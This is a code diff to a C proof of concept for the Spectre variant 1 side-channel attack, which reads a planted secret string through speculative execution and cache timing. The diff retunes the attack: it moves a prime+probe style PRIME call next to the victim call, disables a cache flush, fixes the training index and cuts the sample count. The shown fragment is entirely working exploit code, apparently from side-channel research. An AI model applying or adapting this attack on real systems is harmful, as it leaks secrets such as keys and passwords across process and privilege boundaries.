@@ -26,17 +26,17 @@ uint8_t array2[256 * 512];
 
 char *secret = "The Magic Words are Squeamish Ossifrage.";
 
-uint8_t temp = 0;  /* Used so compiler won't optimize out victim_function() */
 
 void victim_function(size_t x) {
 	if (x < array1_size) {
+		volatile register uint8_t temp = 0;  /* Used so compiler won't optimize out victim_function() */
 		temp &= array2[array1[x] * 64];
 	}
 }
 
 
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
-	int sample_cnt = 100000;
+	int sample_cnt = 1000;
 	static int results[256];
 	int tries, i, j, k, mix_i, junk = 0;
 	size_t training_x, x;
@@ -102,23 +102,24 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 	for (tries = sample_cnt; tries > 0; tries--) {
 
 		/* Flush array2[256*(0..255)] from cache */
-        curr_head = PRIME(curr_head);
 
 		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
-		training_x = tries % array1_size;
-	fprintf(stderr,"The target is: %d\n",((long long)(&array2[array1[training_x]*64])>>6)&0b111111);
-		for (j = 3; j >= 0; j--) {
-			_mm_clflush(&array1_size);
+		// training_x = tries % array1_size;
+		training_x = 0;
+	// fprintf(stderr,"The target is: %d\n",((long long)(&array2[array1[training_x]*64])>>6)&0b111111);
+		for (register int jl = 3; jl >= 0; jl--) {
+			// _mm_clflush(&array1_size);
 			for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */
 
 			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
 			/* Avoid jumps in case those tip off the branch predictor */
-			x = ((j % 6) - 1) & ~0xFFFF;   /* Set x=FFF.FF0000 if j%6==0, else x=0 */
+			x = ((jl % 6) - 1) & ~0xFFFF;   /* Set x=FFF.FF0000 if j%6==0, else x=0 */
 			x = (x | (x >> 16));           /* Set x=-1 if j&6=0, else x=0 */
 			x = training_x ^ (x & (malicious_x ^ training_x));
 
 			// printf("[log] %ld %ld\n",x,malicious_x);
 			/* Call the victim! */
+        curr_head = PRIME(curr_head);
 			victim_function(x);
 		}
 
